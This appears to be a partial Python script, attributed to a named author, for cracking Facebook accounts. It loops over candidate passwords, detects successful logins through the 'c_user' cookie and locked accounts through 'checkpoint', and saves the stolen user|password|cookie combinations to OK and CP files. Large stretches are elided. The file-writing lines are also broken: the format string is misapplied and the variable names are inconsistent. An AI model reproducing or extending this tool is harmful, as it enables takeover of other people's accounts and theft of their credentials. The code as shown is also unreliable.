"""
EMBF     : MD JIBON ISLAM ( BIRGANJ-DINAJPUR) 
BY       : JIBON ISLAM
Made in  :  BANGLADESH 
Versi    : python3
Datetime : Mrx 2 jun 2023
"""
...
def menu():
	...
	try:
		...
		print(f" {K}[{N}>_{K}] {N}LOGIN TERLEBIH DAHULU");time.sleep(3);masuk()
	try:
		...
		try:
			for pw in pwx:
				...
				if "c_user" in ses.cookies.get_dict():
					...
					_wrt_ = "%s|%s|%s\n"%(user,pw,coki)
					open("Jibon/OK-%s","a"%(_datetime)).write(_wrt_)
					break
				elif "checkpoint" in ses.cookies.get_dict():
					print(f" {K}* --> {user}|{pw}")
					cp.append(f"{user}|{pw}")
					_wrt_ = "%s|%s\n"%(user,pw)
					open("Jibon/CP-%s","a"%(_datetime_)).write(_wrt_)
					break
				else:
					continue
			loop +=1
			...
			try:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					if "y" in apk:
						...
						open("Jibon/OK-%s","a"%(_datetime_)).write("\n%s|%s|%s"%(user,pw,coki))
						cek_aplikasi(coki)
					else:
						coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					...
					if "y" in opsi:
						...
						cek_opsi(user,pw)
						open("Jibon/CP-%s","a"%(_datetime_)).write("\n%s|%s"%(user,pw))
					else:
